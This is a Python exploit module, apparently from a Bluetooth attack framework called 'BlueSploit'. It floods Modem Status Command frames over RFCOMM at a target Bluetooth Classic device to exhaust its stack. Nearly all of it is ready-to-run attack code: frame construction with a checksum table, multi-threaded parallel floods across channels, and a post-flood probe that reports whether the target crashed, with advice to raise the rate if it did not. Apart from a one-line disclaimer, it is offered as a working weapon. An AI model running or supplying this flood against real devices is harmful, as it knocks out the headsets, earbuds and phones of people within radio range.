"""
BlueSploit Module: RFCOMM MSC Signaling Flood DoS (2025)
CWE-400 Uncontrolled Resource Consumption via RFCOMM Modem Status Command flood

A resource exhaustion DoS technique targeting Bluetooth Classic devices that
expose HFP (Hands-Free Profile) and auxiliary RFCOMM channels. By flooding
Modem Status Command (MSC) frames at high rate across multiple channels
simultaneously, the target's RFCOMM stack is overwhelmed — causing HFP
audio interruption, connection drops, or firmware crash depending on the
implementation's MSC processing model.

MSC frames signal V.24 modem status changes (DTR, RTS, CTS, DSR, DCD,
ring indicator). Many stacks process each MSC synchronously and invoke
state-machine callbacks, creating a serialization bottleneck when flooded.
Rapid V.24 signal toggling also triggers repeated state transitions that
exhaust firmware task queues on resource-constrained devices.

This is distinct from CVE-2024-50044 (ABBA deadlock) — it is a pure
throughput / processing-overload attack not tied to any specific kernel
version or Linux-only code path.

CWE: CWE-400 (Uncontrolled Resource Consumption)
"""

import struct
import socket
import time
import os
import threading
from typing import Dict
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False

RFCOMM_PSM  = 0x0003
RFCOMM_SABM = 0x2F
RFCOMM_UIH  = 0xEF

MCC_MSC = 0xE3   # Modem Status Command type

# V.24 modem signal byte variants to cycle through during flood.
# Bit layout (ETSI TS 07.10 §5.4.6.3.7):
#   bit7=DV (data valid)  bit6=IC (ring)  bit5=RTR (RTS/CTS)
#   bit4=RTC (DTR/DSR)    bit1=FC (flow control)  bit0=EA (always 1)
V24_VARIANTS = [
    0x8D,   # DV=1 RTR=1 RTC=1 FC=0  — standard "ready"
    0x00,   # all signals deasserted
    0xFF,   # all bits set
    0x9D,   # DV=1 IC=1 RTR=1 RTC=1  — ring indicator asserted
    0x0D,   # RTR=1 RTC=1 only
    0x8C,   # DV=1 FC=1              — data valid + flow control
    0x01,   # FC only
    0x80,   # DV only
]


class Module(ExploitModule):
    """
    RFCOMM MSC Signaling Flood DoS

    Floods RFCOMM MSC (Modem Status Command) frames at high rate across
    HFP and auxiliary channels simultaneously. Each MSC frame signals a
    V.24 modem state change; rapid cycling through signal variants forces
    the target stack to process continuous state transitions, exhausting
    CPU budget or firmware task-queue capacity.

    Attack flow:
    1. Open L2CAP connection(s) to RFCOMM PSM on target
    2. Init RFCOMM mux — SABM on DLCI 0
    3. Open each target channel — SABM on DLCI N (channel << 1 | 1)
    4. Flood UIH-wrapped MSC frames cycling through V24_VARIANTS
    5. Multiple threads attack different channels in parallel

    Impact: HFP audio dropout, Bluetooth stack CPU starvation,
            possible firmware crash on resource-constrained earbuds/headsets
    Range: Bluetooth Classic range (~10m indoors, ~30m line-of-sight)
    """

    info = ModuleInfo(
        name="RFCOMM MSC Signaling Flood",
        description=(
            "High-rate MSC frame flood across HFP and auxiliary RFCOMM channels "
            "causing resource exhaustion DoS (2025)"
        ),
        author=["BlueSploit"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.MEDIUM,
        cve=[],
        references=[
            "https://www.bluetooth.com/specifications/specs/rfcomm-1-2/",
            "https://www.etsi.org/deliver/etsi_ts/107300_107399/107310/08.02.00_60/ts_107310v080200p.pdf",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)",
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="channels",
            required=False,
            description="RFCOMM channels to flood (comma-separated)",
            default="1,2,3",
        ))
        self.add_option(ModuleOption(
            name="rate",
            required=False,
            description="MSC frames per second per connection",
            default=500,
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Flood duration in seconds",
            default=15,
        ))
        self.add_option(ModuleOption(
            name="v24_cycle",
            required=False,
            description="Cycle through all V.24 signal variants (vs. fixed 0x8D)",
            default=True,
        ))
        self.add_option(ModuleOption(
            name="connections_per_channel",
            required=False,
            description="Concurrent L2CAP connections per channel",
            default=2,
        ))

    def check(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(5.0)
            s.connect((target, RFCOMM_PSM))
            s.close()
            print_success(f"RFCOMM PSM reachable — {target} may be vulnerable to MSC flood")
            return True
        except bluetooth.BluetoothError as e:
            print_error(f"Unreachable: {e}")
            return False

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        if os.geteuid() != 0:
            print_error("Root privileges required")
            return False

        target        = self.get_option("target")
        rate          = int(self.get_option("rate"))
        duration      = int(self.get_option("duration"))
        v24_cycle     = self.get_option("v24_cycle")
        conns_per_ch  = int(self.get_option("connections_per_channel"))

        try:
            channels = [int(c.strip()) for c in self.get_option("channels").split(",")]
        except ValueError:
            print_error("channels must be comma-separated integers")
            return False

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        frame_delay   = 1.0 / max(1, rate)
        total_threads = len(channels) * conns_per_ch

        print_info(f"Target       : {target}")
        print_info(f"Channels     : {channels}")
        print_info(f"Rate         : {rate} MSC/s per connection ({rate * total_threads} total/s)")
        print_info(f"Duration     : {duration}s")
        print_info(f"Connections  : {conns_per_ch} per channel ({total_threads} total)")
        print_info(f"V24 cycling  : {'all {len(V24_VARIANTS)} variants' if v24_cycle else 'fixed 0x8D (standard)'}")
        print_info("─" * 55)
        print_warning("DISCLAIMER: For authorized security testing only!")

        stats: Dict[str, int] = {"frames": 0, "errors": 0, "conn_failures": 0}
        stop  = threading.Event()
        lock  = threading.Lock()

        def channel_worker(channel: int) -> None:
            dlci    = channel << 1 | 1
            v24_idx = 0

            while not stop.is_set():
                try:
                    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                    sock.settimeout(3.0)
                    sock.connect((target, RFCOMM_PSM))

                    # Init mux
                    sock.send(self._sabm(0))
                    self._drain(sock, 0.15)

                    # Open DLC on target channel
                    sock.send(self._sabm(dlci))
                    self._drain(sock, 0.10)

                    # Flood MSC frames
                    while not stop.is_set():
                        v24 = V24_VARIANTS[v24_idx % len(V24_VARIANTS)] if v24_cycle else 0x8D
                        if v24_cycle:
                            v24_idx += 1

                        try:
                            sock.send(self._msc(dlci, v24))
                            with lock:
                                stats["frames"] += 1
                        except Exception:
                            with lock:
                                stats["errors"] += 1
                            break

                        # Skip sleep for very high rates (>1000/s)
                        if frame_delay > 0.0008:
                            time.sleep(frame_delay)

                    sock.close()

                except bluetooth.BluetoothError:
                    with lock:
                        stats["conn_failures"] += 1
                    if not stop.is_set():
                        time.sleep(0.1)

        threads = [
            threading.Thread(
                target=channel_worker,
                args=(ch,),
                daemon=True,
            )
            for ch in channels
            for _ in range(conns_per_ch)
        ]
        for t in threads:
            t.start()

        start = time.time()
        print_info(f"Flooding {target} ({duration}s) — Ctrl-C to abort...")

        try:
            while time.time() - start < duration:
                elapsed   = time.time() - start
                remaining = duration - elapsed
                rate_act  = stats["frames"] / elapsed if elapsed > 0 else 0
                print(
                    f"\r  Frames: {stats['frames']:>9,} | Errors: {stats['errors']:>5} "
                    f"| Rate: {rate_act:>7,.0f}/s | {remaining:>4.0f}s left    ",
                    end='', flush=True,
                )
                time.sleep(0.4)
        except KeyboardInterrupt:
            print()
            print_warning("Interrupted")
        finally:
            stop.set()
            print()

        for t in threads:
            t.join(timeout=3.0)

        still_alive = self._probe(target)
        print_info("─" * 55)

        if stats["frames"] > 0:
            print_success(
                f"RFCOMM MSC Flood: {stats['frames']:,} MSC frames sent to {target} "
                f"on channels {channels}"
            )
            if not still_alive:
                print_success("Target not responding after flood — Bluetooth stack may have crashed")
            elif stats["errors"] > stats["frames"] * 0.30:
                print_success(
                    f"High error rate ({stats['errors']}/{stats['frames']}) — "
                    "stack saturation likely"
                )
            else:
                print_info("Target still responding — stack may be resilient or rate too low")
                print_info("Try increasing rate, connections_per_channel, or duration")

            self.add_result({
                "target": target,
                "channels": channels,
                "frames_sent": stats["frames"],
                "errors": stats["errors"],
                "duration": duration,
                "target_alive_after": still_alive,
                "technique": "MSC_signaling_flood",
            })
            return True

        print_error("No MSC frames sent — target unreachable")
        return False

    def _probe(self, target: str) -> bool:
        """Quick L2CAP probe to check if RFCOMM PSM is still reachable."""
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(2.0)
            s.connect((target, RFCOMM_PSM))
            s.close()
            return True
        except Exception:
            return False

    def _sabm(self, dlci: int) -> bytes:
        addr   = (dlci << 2) | 0x03
        ctrl   = RFCOMM_SABM | 0x10
        length = 0x01
        fcs    = self._fcs(bytes([addr, ctrl, length]))
        return struct.pack("BBBB", addr, ctrl, length, fcs)

    def _msc(self, dlci: int, v24: int) -> bytes:
        payload = struct.pack("BB", (dlci << 2) | 0x03, v24)
        mcc     = struct.pack("BB", MCC_MSC, (len(payload) << 1) | 1) + payload
        return self._uih_wrap(mcc)

    def _uih_wrap(self, mcc: bytes) -> bytes:
        addr   = 0x03
        ctrl   = RFCOMM_UIH
        length = (len(mcc) << 1) | 0x01
        fcs    = self._fcs(bytes([addr, ctrl]))
        return struct.pack("BBB", addr, ctrl, length) + mcc + struct.pack("B", fcs)

    def _drain(self, sock, timeout: float) -> None:
        try:
            sock.settimeout(timeout)
            while True:
                sock.recv(512)
        except (socket.timeout, bluetooth.BluetoothError, OSError):
            pass

    @staticmethod
    def _fcs(data: bytes) -> int:
        table = [
            0x00,0x91,0xE3,0x72,0x07,0x96,0xE4,0x75,0x0E,0x9F,0xED,0x7C,0x09,0x98,0xEA,0x7B,
            0x1C,0x8D,0xFF,0x6E,0x1B,0x8A,0xF8,0x69,0x12,0x83,0xF1,0x60,0x15,0x84,0xF6,0x67,
            0x38,0xA9,0xDB,0x4A,0x3F,0xAE,0xDC,0x4D,0x36,0xA7,0xD5,0x44,0x31,0xA0,0xD2,0x43,
            0x24,0xB5,0xC7,0x56,0x23,0xB2,0xC0,0x51,0x2A,0xBB,0xC9,0x58,0x2D,0xBC,0xCE,0x5F,
            0x70,0xE1,0x93,0x02,0x77,0xE6,0x94,0x05,0x7E,0xEF,0x9D,0x0C,0x79,0xE8,0x9A,0x0B,
            0x6C,0xFD,0x8F,0x1E,0x6B,0xFA,0x88,0x19,0x62,0xF3,0x81,0x10,0x65,0xF4,0x86,0x17,
            0x48,0xD9,0xAB,0x3A,0x4F,0xDE,0xAC,0x3D,0x46,0xD7,0xA5,0x34,0x41,0xD0,0xA2,0x33,
            0x54,0xC5,0xB7,0x26,0x53,0xC2,0xB0,0x21,0x5A,0xCB,0xB9,0x28,0x5D,0xCC,0xBE,0x2F,
            0xE0,0x71,0x03,0x92,0xE7,0x76,0x04,0x95,0xEE,0x7F,0x0D,0x9C,0xE9,0x78,0x0A,0x9B,
            0xFC,0x6D,0x1F,0x8E,0xFB,0x6A,0x18,0x89,0xF2,0x63,0x11,0x80,0xF5,0x64,0x16,0x87,
            0xD8,0x49,0x3B,0xAA,0xDF,0x4E,0x3C,0xAD,0xD6,0x47,0x35,0xA4,0xD1,0x40,0x32,0xA3,
            0xC4,0x55,0x27,0xB6,0xC3,0x52,0x20,0xB1,0xCA,0x5B,0x29,0xB8,0xCD,0x5C,0x2E,0xBF,
            0x90,0x01,0x73,0xE2,0x97,0x06,0x74,0xE5,0x9E,0x0F,0x7D,0xEC,0x99,0x08,0x7A,0xEB,
            0x8C,0x1D,0x6F,0xFE,0x8B,0x1A,0x68,0xF9,0x82,0x13,0x61,0xF0,0x85,0x14,0x66,0xF7,
            0xA8,0x39,0x4B,0xDA,0xAF,0x3E,0x4C,0xDD,0xA6,0x37,0x45,0xD4,0xA1,0x30,0x42,0xD3,
            0xB4,0x25,0x57,0xC6,0xB3,0x22,0x50,0xC1,0xBA,0x2B,0x59,0xC8,0xBD,0x2C,0x5E,0xCF,
        ]
        fcs = 0xFF
        for b in data:
            fcs = table[fcs ^ b]
        return 0xFF - fcs
